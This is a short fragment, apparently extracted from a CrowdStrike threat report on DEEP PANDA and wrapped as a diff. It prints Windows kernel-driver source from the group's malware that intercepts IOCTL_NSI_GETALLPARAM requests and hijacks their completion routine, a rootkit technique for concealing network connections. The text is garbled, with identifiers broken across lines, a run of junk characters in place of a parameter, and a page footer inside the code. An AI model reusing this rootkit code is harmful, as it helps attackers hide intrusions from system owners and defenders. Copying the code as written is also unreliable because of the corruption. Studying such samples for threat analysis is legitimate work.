@@ -1,0 +1,37 @@
+DEEP PANDA
+KeDelayExecutionThread(KernelMode,0,&waittime);
+return STATUS_SUCCESS;
+}
+NTSTATUS HPDummyDeviceIoControl(
+�����������������������������������������������
+IN PIRP Irp
+)
+{
+ULONG   ioControlCode;
+PIO_STACK_LOCATION irpStack;
+ULONG   status;
+irpStack = IoGetCurrentIrpStackLocation(Irp);
+ioControlCode = irpStack->Parameters.DeviceIoControl.IoControlCode;
+if(IOCTL_NSI_GETALLPARAM == ioControlCode)
+{
+if(irpStack->Parameters.DeviceIoControl.InputBufferLength == sizeof(NSI_
+PARAM))
+{
+//
+//only care the related I/O
+//
+PHP_CONTEXT ctx = (HP_CONTEXT*)ExAllocatePool(NonPagedPool,sizeof(HP_CON
+TEXT));
+ctx->oldIocomplete = irpStack->CompletionRoutine;
+ctx->oldCtx = irpStack->Context;
+irpStack->CompletionRoutine = HPCompletion;
+irpStack->Context = ctx;
+ctx->pcb = IoGetCurrentProcess();
+if((irpStack->Control&SL_INVOKE_ON_SUCCESS) ==SL_INVOKE_ON_SUCCESS)
+ctx->bShouldInvolve = TRUE;
+else
+ctx->bShouldInvolve = FALSE;
+irpStack->Control |= SL_INVOKE_ON_SUCCESS;
+}
+}
+CROWDSTRIKE S E N S I T I V E 38
